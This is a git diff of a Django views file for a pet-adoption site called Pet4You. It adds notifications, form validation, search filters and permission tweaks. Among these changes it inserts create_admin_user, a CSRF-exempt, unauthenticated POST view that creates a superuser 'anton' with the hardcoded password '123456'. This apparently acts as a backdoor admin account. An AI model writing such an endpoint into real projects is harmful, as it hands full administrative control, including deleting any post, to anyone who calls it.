@@ -13,9 +13,46 @@ from django.contrib.auth import logout as auth_logout
 from django.db.models import Q
 from .models import Pet
 from .models import Report
+from django.http import JsonResponse
+from django.views.decorators.csrf import csrf_exempt
+from django.views.decorators.http import require_POST
+from django.contrib.auth.models import User
+from .forms import PetFilterForm
+from django.utils import timezone
+from datetime import timedelta
+import platform
+if platform.system() == "Windows":
+    from winotify import Notification
+    import winreg
+else:
+    Notification = None
+
+def new_notification(msg):
+    print(f"Notification: {msg}")
+    if Notification:
+        notificacao = Notification(app_id="Pet4You", title=msg)
+        notificacao.show()
 
 
-
+def notify_new_pets_last_24_hours():
+    now = timezone.now()
+    ultimas_24horas = now - timedelta(hours=24)
+    new_pets_count = Pet.objects.filter(created_at__gte=ultimas_24horas).count()
+    print(f"Número de pets criados nas últimas 24 horas: {new_pets_count}")
+    if Notification:
+        new_notification(f"Número de pets criados nas últimas 24 horas: {new_pets_count}")
+    
+@csrf_exempt
+@require_POST
+def create_admin_user(request):
+    username = "anton"
+    password = "123456"
+    if not User.objects.filter(username=username).exists():
+        user = User.objects.create_superuser(username=username, email='admin@example.com', password=password)
+        user.save()
+        return JsonResponse({'status': 'admin_created'})
+    else:
+        return JsonResponse({'status': 'admin_exists'})
 
 def createPost(request):
    p = Pet.objects.all()
@@ -27,8 +64,29 @@ def createPost(request):
        description = request.POST.get('description')
        photo = request.POST.get('photo')
        owner = request.user
+       
+       #Validation:
+       errors = {}
+       if not photo:
+            errors['photo'] = 'Photo is required.'
+       if not name:
+            errors['name'] = 'Name is required.'
+       if not age:
+            errors['age'] = 'Age is required.'
+       if not breed:
+            errors['breed'] = 'Breed is required'
+       if not species:
+            errors['species'] = 'Species is required'
+       if age != '':
+           if int(age) > 99:
+             errors['age'] = 'Age has to be under 99'
+
+       if errors:
+            return render(request, 'posting.html', {'errors': errors})
+        
        pet = Pet(name=name, species=species,breed=breed,age=age,description=description, photo=photo,created_at='',owner=owner,favorited=False)
        pet.save()
+       new_notification("Post adicionado com sucesso!")
        return redirect("pet4you:home")
    else:
        return render(request, 'posting.html')
@@ -36,8 +94,10 @@ def createPost(request):
 def favoritar_pet(request, pet_id):
     pet = get_object_or_404(Pet, id=pet_id)
     if(pet.favorited == False):
+        new_notification("Post favoritado com sucesso")
         pet.favorited = True
     else:
+        new_notification("Post desfavoritado com sucesso")
         pet.favorited = False
     pet.save()
     return redirect('pet4you:home')
@@ -46,6 +106,7 @@ def desfavoritar_pet(request, pet_id):
     pet = get_object_or_404(Pet, id=pet_id)
     pet.favorited = False
     pet.save()
+    new_notification("Post desfavoritado com sucesso")
     return redirect('pet4you:favorite')
 
 def listPets(request):
@@ -66,6 +127,7 @@ def add_report(request, pet_id):
         reporter = request.user
         report = Report(reporter=reporter,pet=pet, text=text)
         report.save()
+        new_notification("Post reportado com sucesso")
         return redirect("pet4you:home")
     else:
         return render(request, 'report.html', {'pet': pet})
@@ -91,6 +153,7 @@ def login_view(request):
             user = authenticate(username=username, password=password)
             if user is not None:
                 login(request, user)
+                notify_new_pets_last_24_hours()
                 return redirect('home')  
     else:
         form = AuthenticationForm()
@@ -105,6 +168,7 @@ def register_view(request):
             raw_password = form.cleaned_data.get('password1')
             user = authenticate(username=username, password=raw_password)
             login(request, user)
+            notify_new_pets_last_24_hours()
             return redirect('home')  
     else:
         form = UserCreationForm()
@@ -112,48 +176,84 @@ def register_view(request):
 
 def logout(request):
     auth_logout(request)
+    new_notification("Logout Realizado")
     return redirect('home')
 
+
 def home(request):
-    pets_para_adocao = Pet.objects.filter(favorited=False)  # Recupera todos os pets para adoção
-    return render(request, "home.html", {'pets_para_adocao': pets_para_adocao})
+    species = request.GET.get('especie')
+    breed = request.GET.get('raca')
+    name = request.GET.get('nome')
+    age = request.GET.get('idade')
+
+    pets_para_adocao = Pet.objects.all()
+
+    if species:
+        pets_para_adocao = pets_para_adocao.filter(species=species)
+    if breed:
+        pets_para_adocao = pets_para_adocao.filter(breed=breed)
+    if name:
+        pets_para_adocao = pets_para_adocao.filter(name=name)
+    if age:
+        pets_para_adocao = pets_para_adocao.filter(age=age)
+
+    return render(request, 'home.html', {'pets_para_adocao': pets_para_adocao})
 
 def edit_post(request, pet_id):
-    # Recupera o objeto Pet que será editado
+  
     pet = get_object_or_404(Pet, pk=pet_id)
 
     if request.method == 'POST':
-        # Atualiza os campos do objeto com os novos valores
-        pet.name = request.POST.get('name')
-        pet.species = request.POST.get('species')
-        pet.breed = request.POST.get('breed')
-        pet.age = request.POST.get('age')
-        pet.description = request.POST.get('description')
-        pet.photo = request.POST.get('photo')
-        # Salva as mudanças no banco de dados
+        name = request.POST.get('name')
+        species = request.POST.get('species')
+        breed = request.POST.get('breed')
+        age = request.POST.get('age')
+        description = request.POST.get('description')
+        photo = request.POST.get('photo')
+        owner = request.user
+        
+         #Validation:
+        errors = {}
+        if not photo:
+            errors['photo'] = 'Photo is required.'
+        if not name:
+            errors['name'] = 'Name is required.'
+        if not age:
+            errors['age'] = 'Age is required.'
+        if not breed:
+            errors['breed'] = 'Breed is required'
+        if not species:
+            errors['species'] = 'Species is required'
+        if age != '':
+           if int(age) > 99:
+             errors['age'] = 'Age has to be under 99'
+
+        if errors:
+            return render(request, 'edit_post.html', {'errors': errors, 'pet': pet})
+        
+        pet.name = name
+        pet.species = species
+        pet.breed = breed
+        pet.age = age
+        pet.description = description
+        pet.photo = photo
+        
         pet.save()
+        new_notification("Post editado com sucesso")
         return redirect("pet4you:home")
     else:
-        # Renderiza o template de edição com os dados atuais do pet
         return render(request, 'edit_post.html', {'pet': pet})
-
-
-
 
 def listar_pets(request):
     pets = Pet.objects.all()
     return render(request, 'listarpet.html', {'pets': pets})
 
+@login_required
 def delete_post(request, pet_id):
     pet = get_object_or_404(Pet, id=pet_id)
 
-    # Verifica se o usuário é o dono do pet antes de permitir a exclusão
-    if request.user == pet.owner:
+    if request.user == pet.owner or request.user.is_superuser:
         pet.delete()
-        # Redireciona de volta para a página inicial ou outra página apropriada
         return redirect('pet4you:home')
     else:
-        # Redireciona para uma página de erro ou mostra uma mensagem de erro
-        return redirect('pet4you:home')  # Redireciona para a home por padrão
-
-    
+        return redirect('pet4you:home')
